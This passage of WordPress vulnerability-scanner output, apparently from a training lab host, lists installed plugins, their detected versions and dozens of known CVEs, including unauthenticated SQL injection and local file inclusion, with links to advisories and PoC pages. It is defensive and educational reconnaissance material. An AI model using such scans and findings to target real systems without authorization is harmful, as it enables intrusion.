 |      - https://wpscan.com/vulnerability/f27d753e-861a-4d8d-9b9a-6c99a8a7ebe0
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2551
 |      - https://github.com/SecuriTrust/CVEsLab/tree/main/CVE-2022-2551
 |      - https://packetstormsecurity.com/files/167896/
 |
 | [!] Title: Duplicator < 1.4.7.1 - Unauthenticated System Information Disclosure
 |     Fixed in: 1.4.7.1
 |     References:
 |      - https://wpscan.com/vulnerability/6b540712-fda5-4be6-ae4b-bd30a9d9d698
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2552
 |      - https://github.com/SecuriTrust/CVEsLab/tree/main/CVE-2022-2552
 |      - https://packetstormsecurity.com/files/167895/
 |
 | [!] Title: Duplicator < 1.5.7.1; Duplicator Pro < 4.5.14.2 - Unauthenticated Sensitive Data Exposure
 |     Fixed in: 1.5.7.1
 |     References:
 |      - https://wpscan.com/vulnerability/5c5d41b9-1463-4a9b-862f-e9ee600ef8e1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6114
 |      - https://research.cleantalk.org/cve-2023-6114-duplicator-poc-exploit
 |
 | [!] Title: Duplicator < 1.5.7.1 - Settings Removal via CSRF
 |     Fixed in: 1.5.7.1
 |     References:
 |      - https://wpscan.com/vulnerability/c2aca72c-6aa5-4fda-966f-f4f045eda828
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-51681
 |      - https://patchstack.com/database/vulnerability/duplicator/wordpress-duplicator-plugin-1-5-7-cross-site-request-forgery-csrf-vulnerability
 |
 | [!] Title: Duplicator < 1.5.10 - Full Path Disclosure
 |     Fixed in: 1.5.10
 |     References:
 |      - https://wpscan.com/vulnerability/7026d0be-9e57-4ef4-84a2-f7122e36c0cd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6210
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/d47d582d-7c90-4f49-aee1-03a8775b850d
 |
 | Version: 1.3.34 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/duplicator/readme.txt

[+] email-subscribers
 | Location: http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/
 | Last Updated: 2025-10-24T06:00:00.000Z
 | Readme: http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
 | [!] The version is out of date, the latest version is 5.9.8
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/, status: 200
 |
 | [!] 30 vulnerabilities identified:
 |
 | [!] Title: Email Subscribers & Newsletters < 4.2.3 - Multiple Issues
 |     Fixed in: 4.2.3
 |     References:
 |      - https://wpscan.com/vulnerability/a0764617-6142-4ef7-94f9-1fb923e81e94
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19985
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19984
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19982
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19981
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19980
 |      - https://www.wordfence.com/blog/2019/11/multiple-vulnerabilities-patched-in-email-subscribers-newsletters-plugin/
 |      - https://cxsecurity.com/issue/WLB-2020080034
 |
 | [!] Title: Email Subscribers & Newsletters < 4.3.1 - Unauthenticated Blind SQL Injection
 |     Fixed in: 4.3.1
 |     References:
 |      - https://wpscan.com/vulnerability/982b1fe4-12de-41f1-9a26-7bf1fc2c8bb6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20361
 |      - https://www.wordfence.com/blog/2019/11/multiple-vulnerabilities-patched-in-email-subscribers-newsletters-plugin/
 |
 | [!] Title: Email Subscribers & Newsletters < 4.5.1 - Cross-site Request Forgery in send_test_email()
 |     Fixed in: 4.5.1
 |     References:
 |      - https://wpscan.com/vulnerability/e6f3170b-9589-4405-afcf-f2756b1f496f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5767
 |      - https://www.tenable.com/security/research/tra-2020-44-0
 |
 | [!] Title: Email Subscribers & Newsletters < 4.5.1 - Authenticated SQL injection in es_newsletters_settings_callback()
 |     Fixed in: 4.5.1
 |     References:
 |      - https://wpscan.com/vulnerability/d3f027c6-3006-45f2-aa5d-c8b9bb602c66
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5768
 |      - https://www.tenable.com/security/research/tra-2020-44-0
 |
 | [!] Title: Email Subscribers & Newsletters < 4.5.6 - Unauthenticated email forgery/spoofing
 |     Fixed in: 4.5.6
 |     References:
 |      - https://wpscan.com/vulnerability/cf3f71c2-6de2-4c8c-b7c4-29a63971777d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5780
 |      - https://www.tenable.com/security/research/tra-2020-53
 |      - https://portswigger.net/daily-swig/vulnerability-in-wordpress-email-marketing-plugin-patched
 |
 | [!] Title: Email Subscribers & Newsletters < 5.3.2 - Subscriber+ Blind SQL injection
 |     Fixed in: 5.3.2
 |     References:
 |      - https://wpscan.com/vulnerability/729d3e67-d081-4a4e-ac1e-f6b0a184f095
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0439
 |
 | [!] Title: Email Subscribers & Newsletters < 5.3.2 - Unauthenticated arbitrary option update
 |     Fixed in: 5.3.2
 |     Reference: https://wpscan.com/vulnerability/fd56191a-8a01-4ae4-a1f1-61a6ac210325
 |
 | [!] Title: Icegram Express < 5.5.1 - Subscriber+ SQLi
 |     Fixed in: 5.5.1
 |     References:
 |      - https://wpscan.com/vulnerability/78054d08-0227-426c-903d-d146e0919028
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3981
 |
 | [!] Title: Icegram Express < 5.6.24 -  Admin+ Directory Traversal
 |     Fixed in: 5.6.24
 |     References:
 |      - https://wpscan.com/vulnerability/9efb7005-a490-42b4-b7b6-b6ac5af072f0
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5414
 |
 | [!] Title: Email Subscribers & Newsletters < 5.5.3 - Improper Neutralization of Formula Elements in a CSV File
 |     Fixed in: 5.5.3
 |     References:
 |      - https://wpscan.com/vulnerability/d11e6820-18ef-4def-a439-6b76f99f1647
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-45810
 |
 | [!] Title: Email Subscribers & Newsletters < 5.7.12 - Reflected Cross-Site Scripting via campaign_id
 |     Fixed in: 5.7.12
 |     References:
 |      - https://wpscan.com/vulnerability/3d72bc7b-c065-4ff3-b6d2-35a68094d436
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22300
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/a84d6f64-9ebb-4773-a9c1-8f23fb2801a9
 |
 | [!] Title: Icegram Express < 5.7.16 - Authenticated (Administrator+) Cross-Site Scripting via CSV import
 |     Fixed in: 5.7.16
 |     References:
 |      - https://wpscan.com/vulnerability/2bf311cf-50f5-42b0-b6ff-d568d6659c4a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2656
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/159ddb06-e7c4-4279-a8a1-c78a02e15891
 |
 | [!] Title: Email Subscribers & Newsletters < 5.7.14 - Missing Authorization
 |     Fixed in: 5.7.14
 |     References:
 |      - https://wpscan.com/vulnerability/89b5c998-6fb2-4298-8ad0-90d756c4446f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-31352
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/d09d8ac7-67f4-490b-8d09-6811f132fede
 |
 | [!] Title: Icegram Express - Email Subscribers, Newsletters and Marketing Automation Plugin < 5.7.15 - Unauthenticated SQL Injection
 |     Fixed in: 5.7.15
 |     References:
 |      - https://wpscan.com/vulnerability/6e8d56bf-cba3-4953-b575-79da8b73eb81
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2876
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/e0ca6ac4-0d89-4601-94fc-cce5a0af9c56
 |
 | [!] Title: Email Subscribers by Icegram Express < 5.7.20 - Missing Authorization in handle_ajax_request
 |     Fixed in: 5.7.20
 |     References:
 |      - https://wpscan.com/vulnerability/e9197602-9290-444a-84ab-8af8902c51b7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4010
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/23bfcdd1-b99d-47eb-9f88-96f9ecc53b32
 |
 | [!] Title: Email Subscribers by Icegram Express – Email Marketing, Newsletters, Automation for WordPress & WooCommerce < 5.7.18 - Missing Authorization
 |     Fixed in: 5.7.18
 |     References:
 |      - https://wpscan.com/vulnerability/6b325cc2-00f4-4d7b-a846-3c3fd183af14
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-3626
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/5a56e621-2508-4500-b865-4d5e4463b91a
 |
 | [!] Title: Email Subscribers by Icegram Express < 5.7.21 - Unauthenticated SQL Injection via hash
 |     Fixed in: 5.7.21
 |     References:
 |      - https://wpscan.com/vulnerability/20701e9d-8e43-4cda-9c76-0f3f797cc0bc
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4295
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/641123af-1ec6-4549-a58c-0a08b4678f45
 |
 | [!] Title: Icegram Express  < 5.7.23 - Authenticated (Subscriber+) SQL Injection Vulnerability via options[list_id]
 |     Fixed in: 5.7.23
 |     References:
 |      - https://wpscan.com/vulnerability/2530bf0c-2530-4b1e-8e3e-33f7cf8608ae
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4845
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/21be2215-8ce0-438e-94e0-6a350b8cc952
 |
 | [!] Title: Icegram Express - Email Subscribers, Newsletters and Marketing Automation Plugin < 5.7.24 - Unauthenticated SQL Injection via optin
 |     Fixed in: 5.7.24
 |     References:
 |      - https://wpscan.com/vulnerability/5e998d7e-36f8-4c6a-8c71-2ff52a1a1773
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5756
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c5bd11c6-2f55-4eee-834a-c4e405482b9c
 |
 | [!] Title: Email Subscribers by Icegram Express – Email Marketing, Newsletters, Automation for WordPress & WooCommerce < 5.7.26 - Unauthenticated SQL Injection via unsubscribe
 |     Fixed in: 5.7.26
 |     References:
 |      - https://wpscan.com/vulnerability/df83b273-1635-4942-b3b7-4e5fffc65f72
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6172
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/13629598-d45d-4ff5-aeb5-6ac881d25183
 |
 | [!] Title: Icegram Express - Email Subscribers, Newsletters and Marketing Automation Plugin < 5.7.27 - Missing Authorization
 |     Fixed in: 5.7.27
 |     References:
 |      - https://wpscan.com/vulnerability/9ccdbbeb-7a17-487c-b640-0f5dddd3250c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5703
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/22283650-36bf-43e5-a57e-a91025fb2af7
 |
 | [!] Title: Email Subscribers by Icegram Express – Email Marketing, Newsletters, Automation for WordPress & WooCommerce < 5.7.35 - Missing Authorization to Authenticated (Subscriber+) Sensitive Information Exposure
 |     Fixed in: 5.7.35
 |     References:
 |      - https://wpscan.com/vulnerability/04a679d2-a01e-405c-bb94-40355b334f6b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8771
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/f9d90717-fd48-493b-9293-32976bf2cada
 |
 | [!] Title: Email Subscribers by Icegram Express – Email Marketing, Newsletters, Automation for WordPress & WooCommerce < 5.7.35 - Authenticated (Subscriber+) Arbitrary Shortcode Execution
 |     Fixed in: 5.7.35
 |     References:
 |      - https://wpscan.com/vulnerability/4aef3f7f-3d73-407b-93a1-12b6ece51854
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8254
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7d4ae4a7-aec1-4cc1-bea0-61dde44027fc
 |
 | [!] Title: Email Subscribers < 5.7.44 - Admin+ SQL Injection
 |     Fixed in: 5.7.44
 |     References:
 |      - https://wpscan.com/vulnerability/5e00ba37-da7f-4703-a0b9-65237696fbdd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12311
 |      - https://research.cleantalk.org/cve-2024-12311
 |
 | [!] Title: Email Subscribers < 5.7.45 - Admin+ Stored XSS
 |     Fixed in: 5.7.45
 |     References:
 |      - https://wpscan.com/vulnerability/da616c20-3d74-4d3a-95f5-2d71d9ada094
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-11636
 |      - https://research.cleantalk.org/cve-2024-11636
 |
 | [!] Title: Email Subscribers < 5.7.45 - Admin+ Stored XSS
 |     Fixed in: 5.7.45
 |     References:
 |      - https://wpscan.com/vulnerability/9206064a-d54e-44ad-9670-65520ee166a6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12566
 |      - https://research.cleantalk.org/cve-2024-12566/
 |
 | [!] Title: Email Subscribers < 5.7.45 - Admin+ Stored XSS
 |     Fixed in: 5.7.45
 |     References:
 |      - https://wpscan.com/vulnerability/82051ccc-c528-4ff3-900a-3b8e8ad34145
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12567
 |      - https://research.cleantalk.org/cve-2024-12567/
 |
 | [!] Title: Email Subscribers < 5.7.45 - Admin+ Stored XSS
 |     Fixed in: 5.7.45
 |     References:
 |      - https://wpscan.com/vulnerability/0ce9075a-754b-474e-9620-17da8ee29b56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12568
 |      - https://research.cleantalk.org/cve-2024-12568/
 |
 | [!] Title: Email Subscribers < 5.7.52 - Admin+ Stored XSS
 |     Fixed in: 5.7.52
 |     References:
 |      - https://wpscan.com/vulnerability/70288369-132d-4211-bca0-0411736df747
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-11924
 |      - https://research.cleantalk.org/cve-2024-11924
 |
 | [!] Title: Email Subscribers < 5.7.50 - Admin+ Stored XSS in Template
 |     Fixed in: 5.7.50
 |     References:
 |      - https://wpscan.com/vulnerability/f4e04f01-31cb-4f5e-9739-12f803600e60
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0671
 |      - https://research.cleantalk.org/cve-2025-0671/
 |
 | Version: 4.2.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt

[+] site-editor
 | Location: http://blog.inlanefreight.local/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 | Readme: http://blog.inlanefreight.local/wp-content/plugins/site-editor/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/site-editor/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/site-editor/readme.txt

[+] the-events-calendar
 | Location: http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/
 | Last Updated: 2025-10-21T18:01:00.000Z
 | Readme: http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/readme.txt
 | [!] The version is out of date, the latest version is 6.15.9
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/, status: 200
 |
 | [!] 19 vulnerabilities identified:
 |
 | [!] Title: Unauthorised AJAX Calls via Freemius
 |     Fixed in: 5.14.0.4
 |     Reference: https://wpscan.com/vulnerability/6dae6dca-7474-4008-9fe5-4c62b9f12d0a
 |
 | [!] Title: The Events Calendar < 5.14.0 - Reflected Cross-Site Scripting
 |     Fixed in: 5.14.0
 |     Reference: https://wpscan.com/vulnerability/533f213b-9fb7-47da-a42c-780aea3aee11
 |
 | [!] Title: Freemius SDK < 2.5.10 - Reflected Cross-Site Scripting
 |     Fixed in: 6.1.0
 |     References:
 |      - https://wpscan.com/vulnerability/35d2f1e7-a4f8-49fd-a8dd-bb2c26710f93
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33999
 |
 | [!] Title: The Events Calendar < 6.2.8.1 - Unauthenticated Arbitrary Password Protected Post Read
 |     Fixed in: 6.2.8.1
 |     References:
 |      - https://wpscan.com/vulnerability/229273e6-e849-447f-a95a-0730969ecdae
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6203
 |
 | [!] Title: The Events Calendar < 6.2.9 - Unauthenticated Sensitive Information Exposure
 |     Fixed in: 6.2.9
 |     References:
 |      - https://wpscan.com/vulnerability/27b3156e-25af-4976-876e-db364a366213
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6557
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/fc40196e-c0f3-4bc6-ac4b-b866902def61
 |
 | [!] Title: The Events Calendar < 6.4.0.1 - Reflected XSS
 |     Fixed in: 6.4.0.1
 |     References:
 |      - https://wpscan.com/vulnerability/b2a92316-e404-4a5e-8426-f88df6e87550
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4180
 |
 | [!] Title: The Events Calendar (Free < 6.4.0.1, Pro < 6.4.0.1) - Contributor+ Arbitrary Events Access
 |     Fixed in: 6.4.0.1
 |     References:
 |      - https://wpscan.com/vulnerability/3cffbeb0-545a-4002-b02c-0fa38cada1db
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1295
 |
 | [!] Title: The Events Calendar Free & Pro <= 6.4.0 - Contributor+ Missing Authorization to Authenticated Arbitrary Events Access
 |     Fixed in: 6.4.0.1
 |     References:
 |      - https://wpscan.com/vulnerability/9b46fd80-f85e-4ae1-ac9a-2fa85361c8a7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1295
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/974c0e94-8d09-488a-9a09-49f0b9ce112c
 |
 | [!] Title: The Events Calendar < 6.5.1.5 - Cross-Site Request Forgery via action_restore_events
 |     Fixed in: 6.5.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/dadc908f-e301-4326-abe2-11c1e4fe0c83
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-37518
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/dc762385-a099-4bec-9b30-ebbbc00faaeb
 |
 | [!] Title: The Events Calendar < 6.5.2 - Unauthenticated Stored Cross-Site Scripting
 |     Fixed in: 6.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/1ec8c194-d005-4d13-b26e-90cff45f2d1b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6931
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/a5f847d8-323f-47f9-ba10-df8173ff3018
 |
 | [!] Title: The Events Calendar < 6.6.4 - Admin+ Stored XSS
 |     Fixed in: 6.6.4
 |     References:
 |      - https://wpscan.com/vulnerability/561b3185-501a-4a75-b880-226b159c0431
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8493
 |      - https://research.cleantalk.org/cve-2024-8493/
 |      - https://www.youtube.com/watch?v=https://drive.google.com/file/d/1WwYVbw-Xd1JfOTH3GHKVkfyy5DpcIxwm/view?usp=sharing
 |
 | [!] Title: The Events Calendar < 6.6.4.1 - Unauthenticated SQL Injection
 |     Fixed in: 6.6.4.1
 |     References:
 |      - https://wpscan.com/vulnerability/d2bef15c-1625-4271-813f-fb917c9c7d92
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8275
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/f59891c7-db1a-4688-8616-8877d7d7960d
 |
 | [!] Title: The Events Calendar < 6.8.2.1 - Unauthenticated Password Protected Event Disclosure
 |     Fixed in: 6.8.2.1
 |     References:
 |      - https://wpscan.com/vulnerability/764b5a23-8b51-4882-b899-beb54f684984
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5333
 |
 | [!] Title: The Events Calendar < 6.9.1 - Contributor+ Stored XSS
 |     Fixed in: 6.9.1
 |     References:
 |      - https://wpscan.com/vulnerability/c4b29496-8908-4aaf-98e6-a966527332c1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12118
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/d67de4f2-b680-49f8-be95-c2464b70f7d0
 |
 | [!] Title: The Events Calendar < 6.7.1 - Trashed Events Restoration via CSRF
 |     Fixed in: 6.7.1
 |     References:
 |      - https://wpscan.com/vulnerability/420b37f9-aba9-4873-ad09-e7b05d2a9482
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-24537
 |      - https://patchstack.com/database/wordpress/plugin/the-events-calendar/vulnerability/wordpress-the-events-calendar-plugin-6-7-0-cross-site-request-forgery-csrf-vulnerability
 |
 | [!] Title: The Events Calendar < 6.12.0 - Subscriber+ Import Creation
 |     Fixed in: 6.12.0
 |     References:
 |      - https://wpscan.com/vulnerability/f7e63579-0a8c-4d88-9a9e-6579fb14274d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-48246
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/fe2fd740-b5b5-4a2a-88fc-b19b2f0f6a2b
 |
 | [!] Title: The Events Calendar < 6.13.2.1 - Contributor+ DOM-Based Stored XSS
 |     Fixed in: 6.13.2.1
 |     References:
 |      - https://wpscan.com/vulnerability/57d880aa-9645-4f92-9ae5-b3b23a3f9794
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-5144
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/56822fe5-352c-4269-9fab-d8c796362b74
 |
 | [!] Title: The Events Calendar < 6.15.1.1 -  Unauthenticated SQL Injection
 |     Fixed in: 6.15.1.1
 |     References:
 |      - https://wpscan.com/vulnerability/46854e0d-b84e-4cd2-a435-60184bd3a6e1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-9807
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8ea2ce90-6c8c-4a31-8faa-4ab99879d8b8
 |
 | [!] Title: The Events Calendar < 6.15.3 - Unauthenticated Password-Protected Information Disclosure
 |     Fixed in: 6.15.3
 |     References:
 |      - https://wpscan.com/vulnerability/c95b984f-a477-4fd4-88db-9225837abaaa
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-9808
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0f2968d6-f1b1-4cd5-b76b-9dc0f6dd1a6a
 |
 | Version: 5.1.2.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/readme.txt

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 7
 | Requests Remaining: 18

[+] Finished: Sat Oct 25 14:36:19 2025
[+] Requests Done: 113826
[+] Cached Requests: 15
[+] Data Sent: 32.636 MB
[+] Data Received: 16.202 MB
[+] Memory used: 437.371 MB
[+] Elapsed time: 00:07:42
```